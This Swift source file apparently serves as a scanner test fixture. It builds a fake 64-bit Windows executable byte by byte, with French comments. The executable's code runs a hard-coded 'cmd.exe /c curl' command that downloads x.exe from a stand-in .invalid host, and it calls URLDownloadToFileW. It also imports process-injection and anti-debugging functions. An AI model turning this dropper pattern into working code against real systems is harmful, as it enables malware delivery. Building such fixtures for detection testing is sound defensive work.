import Foundation

/// Programme Windows d'essai (PE 64 bits), écrit octet par octet : il n'est jamais lancé (et ne pourrait pas l'être
/// sur un Mac). Son code appelle `WinExec` avec une commande écrite dans le programme, `URLDownloadToFileW` avec une
/// adresse en UTF-16, et importe de quoi écrire dans un autre programme. Les domaines finissent en `.invalid`.
extension Fabrique {
    static let commandeWindows = "cmd.exe /c curl https://charge.example.invalid/x.exe -o %TEMP%\\x.exe"
    static let adresseWindows = "https://collecte.example.invalid/envoi"

    /// `empaquete` : ajoute une section « UPX1 » au contenu aléatoire (code compressé ou chiffré).
    /// `surplus` : octets ajoutés après la dernière section. `dotnet` : marque le programme comme .NET.
    static func pe(empaquete: Bool = false, surplus: Int = 0, dotnet: Bool = false) -> Data {
        func u16(_ v: Int) -> [UInt8] { [UInt8(v & 0xFF), UInt8(v >> 8 & 0xFF)] }
        func u32(_ v: Int) -> [UInt8] { (0..<4).map { UInt8(v >> (8 * $0) & 0xFF) } }
        func u64(_ v: Int) -> [UInt8] { (0..<8).map { UInt8(v >> (8 * $0) & 0xFF) } }
        func aligner(_ o: inout [UInt8], _ a: Int) { o += [UInt8](repeating: 0, count: (a - o.count % a) % a) }
        let base = 0x1_4000_0000, texteRVA = 0x1000, donneesRVA = 0x2000, empaqueRVA = 0x3000

        // Section de données : tables d'import, puis les textes.
        let imports: [(dll: String, fonctions: [String])] = [
            ("KERNEL32.dll", ["WinExec", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "IsDebuggerPresent", "GetModuleHandleW"]),
            ("urlmon.dll", ["URLDownloadToFileW"]),
        ]
        var d: [UInt8] = []
        // Adresses des cases de la table d'import (IAT), remplies plus bas.
        var iat: [String: Int] = [:], debutsIAT: [Int] = []
        for (_, fonctions) in imports {
            debutsIAT.append(d.count)
            for f in fonctions { iat[f] = donneesRVA + d.count; d += u64(0) }
            d += u64(0)
        }
        let descripteurs = d.count
        d += [UInt8](repeating: 0, count: 20 * (imports.count + 1))
        var debutsILT: [Int] = []
        for (_, fonctions) in imports {
            debutsILT.append(d.count)
            d += [UInt8](repeating: 0, count: 8 * (fonctions.count + 1))
        }
        var nomsDLL: [Int] = []
        for (i, (dll, fonctions)) in imports.enumerated() {
            for (j, f) in fonctions.enumerated() {
                aligner(&d, 2)
                let rva = donneesRVA + d.count
                d += u16(0) + Array(f.utf8) + [0]
                d.replaceSubrange(debutsIAT[i] + 8 * j ..< debutsIAT[i] + 8 * j + 8, with: u64(rva))
                d.replaceSubrange(debutsILT[i] + 8 * j ..< debutsILT[i] + 8 * j + 8, with: u64(rva))
            }
            nomsDLL.append(donneesRVA + d.count)
            d += Array(dll.utf8) + [0]
        }
        for i in imports.indices {
            let descripteur = u32(donneesRVA + debutsILT[i]) + u32(0) + u32(0) + u32(nomsDLL[i]) + u32(donneesRVA + debutsIAT[i])
            d.replaceSubrange(descripteurs + 20 * i ..< descripteurs + 20 * i + 20, with: descripteur)
        }
        aligner(&d, 8)
        let commande = donneesRVA + d.count
        d += Array(commandeWindows.utf8) + [0]
        aligner(&d, 2)
        let adresse = donneesRVA + d.count
        d += adresseWindows.utf16.flatMap { u16(Int($0)) } + [0, 0]
        let destination = donneesRVA + d.count
        d += "C:\\Users\\Public\\x.exe".utf16.flatMap { u16(Int($0)) } + [0, 0]
        let tailleDonnees = d.count
        aligner(&d, 0x200)

        // Code : chaque adresse est relative à la fin de l'instruction (adressage par rapport à RIP).
        var c: [UInt8] = []
        func relatif(_ prefixe: [UInt8], vers cible: Int) {
            c += prefixe
            c += u32(cible - (texteRVA + c.count + 4))
        }
        c += [0x48, 0x83, 0xEC, 0x28]                       // sub rsp, 0x28
        relatif([0x48, 0x8D, 0x0D], vers: commande)         // lea rcx, [commande]
        c += [0x31, 0xD2]                                   // xor edx, edx
        relatif([0xFF, 0x15], vers: iat["WinExec"]!)        // call [WinExec]
        c += [0x31, 0xC9]                                   // xor ecx, ecx
        relatif([0x48, 0x8D, 0x15], vers: adresse)          // lea rdx, [adresse]
        relatif([0x4C, 0x8D, 0x05], vers: destination)      // lea r8, [destination]
        c += [0x45, 0x31, 0xC9]                             // xor r9d, r9d
        relatif([0xFF, 0x15], vers: iat["URLDownloadToFileW"]!)
        relatif([0xFF, 0x15], vers: iat["IsDebuggerPresent"]!)
        c += [0x48, 0x83, 0xC4, 0x28, 0xC3]                 // add rsp, 0x28 ; ret
        let tailleCode = c.count
        aligner(&c, 0x200)

        var aleatoire: [UInt8] = []
        if empaquete {
            var g = SystemRandomNumberGenerator()
            aleatoire = (0..<0x1000).map { _ in UInt8.random(in: 0...255, using: &g) }
        }
        let sections: [(nom: String, rva: Int, taille: Int, brut: [UInt8], caracteristiques: Int)] =
            [(".text", texteRVA, tailleCode, c, 0x6000_0020), (".rdata", donneesRVA, tailleDonnees, d, 0x4000_0040)]
            + (empaquete ? [("UPX1", empaqueRVA, aleatoire.count, aleatoire, 0xE000_0040)] : [])

        // En-tête DOS habituel : le petit programme qui affiche « This program cannot be run in DOS mode ».
        var f: [UInt8] = Array("MZ".utf8) + [UInt8](repeating: 0, count: 0x3A) + u32(0x80)
        f += [0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21]
        f += Array("This program cannot be run in DOS mode.\r\r\n$".utf8)
        aligner(&f, 0x80)
        f += Array("PE".utf8) + [0, 0]
        f += u16(0x8664) + u16(sections.count) + u32(0x6500_0000) + u32(0) + u32(0) + u16(0xF0) + u16(0x22)
        f += u16(0x20B) + [14, 0] + u32(0x200) + u32(0x200) + u32(0) + u32(texteRVA) + u32(texteRVA)
        f += u64(base) + u32(0x1000) + u32(0x200) + u16(6) + u16(0) + u16(0) + u16(0) + u16(6) + u16(0) + u32(0)
        f += u32(texteRVA + 0x1000 * sections.count) + u32(0x200) + u32(0) + u16(3) + u16(0x8160)
        f += u64(0x100000) + u64(0x1000) + u64(0x100000) + u64(0x1000) + u32(0) + u32(16)
        for repertoire in 0..<16 {
            switch repertoire {
            case 1: f += u32(donneesRVA + descripteurs) + u32(20 * (imports.count + 1))
            case 12: f += u32(donneesRVA) + u32(descripteurs)
            case 14 where dotnet: f += u32(donneesRVA) + u32(72)
            default: f += u64(0)
            }
        }
        var position = 0x200
        for s in sections {
            f += Array(s.nom.utf8) + [UInt8](repeating: 0, count: 8 - s.nom.utf8.count)
            f += u32(s.taille) + u32(s.rva) + u32(s.brut.count) + u32(position) + u32(0) + u32(0) + u16(0) + u16(0) + u32(s.caracteristiques)
            position += s.brut.count
        }
        aligner(&f, 0x200)
        for s in sections { f += s.brut }
        f += [UInt8](repeating: 0x41, count: surplus)
        return Data(f)
    }
}
